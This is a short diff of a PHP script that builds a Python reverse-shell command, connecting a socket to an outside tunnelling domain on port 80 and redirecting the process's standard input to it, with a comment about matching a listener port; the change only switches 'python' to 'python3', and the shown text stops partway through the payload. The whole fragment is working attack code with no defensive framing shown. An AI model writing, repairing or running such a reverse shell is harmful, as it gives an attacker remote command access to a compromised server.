@@ -2,7 +2,7 @@
 $domain = 'ad6aa00c0584b1.lhr.life'; // use the domain name
 $port = 80; // must match your listener port
 
-$cmd = "python -c \"import socket,subprocess,os;" .
+$cmd = "python3 -c \"import socket,subprocess,os;" .
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" .
        "s.connect(('$domain',$port));" .
        "os.dup2(s.fileno(),0);" .
